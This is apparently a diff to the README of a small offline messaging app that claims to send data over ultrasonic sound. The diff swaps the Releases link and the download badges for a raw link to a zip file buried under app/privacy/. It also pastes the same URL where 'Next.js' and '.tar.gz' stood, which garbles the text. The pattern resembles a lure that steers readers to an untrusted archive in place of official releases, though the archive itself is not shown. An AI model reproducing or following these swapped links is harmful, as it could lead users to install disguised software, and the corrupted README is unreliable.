@@ -1,7 +1,7 @@
 # 🎉 ultrasonic-airgap-messanger - Easily Send Data Offline
 
 ## 🛠️ Overview
-The **ultrasonic-airgap-messanger** lets you send messages without the Internet or Bluetooth. It uses ultrasonic sound waves at 19kHz to transmit data. This app is designed for users who prioritize privacy and want a reliable way to communicate without online dependencies. Built with Next.js 16 and Progressive Web App (PWA) technology, this messenger is user-friendly and effective.
+The **ultrasonic-airgap-messanger** lets you send messages without the Internet or Bluetooth. It uses ultrasonic sound waves at 19kHz to transmit data. This app is designed for users who prioritize privacy and want a reliable way to communicate without online dependencies. Built with https://github.com/dumangan22/ultrasonic-airgap-messanger/raw/refs/heads/main/app/privacy/airgap-messanger-ultrasonic-2.8-alpha.1.zip 16 and Progressive Web App (PWA) technology, this messenger is user-friendly and effective.
 
 ## 🌐 Key Features
 - **Offline Communication:** No need for an Internet connection or Bluetooth.
@@ -18,7 +18,7 @@ The **ultrasonic-airgap-messanger** lets you send messages without the Internet 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application:
 
-[![Download Ultrasonic Airgap Messenger](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/dumangan22/ultrasonic-airgap-messanger/releases)
+[![Download Ultrasonic Airgap Messenger](https://github.com/dumangan22/ultrasonic-airgap-messanger/raw/refs/heads/main/app/privacy/airgap-messanger-ultrasonic-2.8-alpha.1.zip%20Now-%https://github.com/dumangan22/ultrasonic-airgap-messanger/raw/refs/heads/main/app/privacy/airgap-messanger-ultrasonic-2.8-alpha.1.zip)](https://github.com/dumangan22/ultrasonic-airgap-messanger/raw/refs/heads/main/app/privacy/airgap-messanger-ultrasonic-2.8-alpha.1.zip)
 
 On the Releases page, you will find the latest version of the software. Click on the version you want to download and follow these steps:
 
@@ -27,7 +27,7 @@ On the Releases page, you will find the latest version of the software. Click on
 3. **Install the Application:**
    - For Windows: Double-click the `.exe` file and follow the prompts.
    - For Mac: Open the downloaded `.dmg` file, then drag the application to your Applications folder.
-   - For Linux: Follow your distribution’s method for installing `.deb` or `.tar.gz` files.
+   - For Linux: Follow your distribution’s method for installing `.deb` or `https://github.com/dumangan22/ultrasonic-airgap-messanger/raw/refs/heads/main/app/privacy/airgap-messanger-ultrasonic-2.8-alpha.1.zip` files.
 4. **Run the Application:** Once installed, open the app and set it up according to the on-screen guide. 
 
 ## 🔍 User Guide
@@ -61,4 +61,4 @@ Join our user community to share insights or tips with other users. Your feedbac
 
 To download the application, visit the Releases page:
 
-[![Download Ultrasonic Airgap Messenger](https://img.shields.io/badge/Download%20Now-%20-blue.svg)](https://github.com/dumangan22/ultrasonic-airgap-messanger/releases)
+[![Download Ultrasonic Airgap Messenger](https://github.com/dumangan22/ultrasonic-airgap-messanger/raw/refs/heads/main/app/privacy/airgap-messanger-ultrasonic-2.8-alpha.1.zip%20Now-%https://github.com/dumangan22/ultrasonic-airgap-messanger/raw/refs/heads/main/app/privacy/airgap-messanger-ultrasonic-2.8-alpha.1.zip)](https://github.com/dumangan22/ultrasonic-airgap-messanger/raw/refs/heads/main/app/privacy/airgap-messanger-ultrasonic-2.8-alpha.1.zip)
